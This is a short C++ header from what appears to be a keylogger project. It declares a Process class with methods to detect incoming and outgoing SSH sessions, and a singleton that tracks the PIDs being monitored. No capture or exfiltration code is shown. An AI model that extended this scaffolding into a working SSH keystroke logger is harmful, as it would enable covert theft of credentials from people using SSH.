#ifndef KEYLOGGER_PROCESS_HPP
#define KEYLOGGER_PROCESS_HPP

#include "parsing.hpp"

class Process{
public:
    Process(std::string user, uint16_t pid, std::string cmd, std::string args):
            _user(std::move(user)), _pid(pid), _cmd(std::move(cmd)), _args(std::move(args)){};

    bool find_incoming_ssh() const;
    bool find_outgoing_ssh() const;

    uint16_t get_pid() const {
        return _pid;
    }

private:
    std::string _user;
    uint16_t _pid;
    std::string _cmd;
    std::string _args;
};


class HandledProcesses{
public:
    HandledProcesses(const HandledProcesses&) = delete;
    HandledProcesses(HandledProcesses&&) = delete;
    HandledProcesses& operator= (const HandledProcesses&) = delete;
    HandledProcesses& operator= (HandledProcesses&&) = delete;

    static HandledProcesses& getInstance(){
        static HandledProcesses instance{};
        return instance;
    }

    void remove_from_proc_list(uint16_t pid);

    std::vector<uint16_t> get_current_proc_list(){
        return procs_in_monitoring;
    };

private:
    HandledProcesses() = default;

private:
    std::vector<uint16_t> procs_in_monitoring{};
};

#endif //KEYLOGGER_PROCESS_HPP
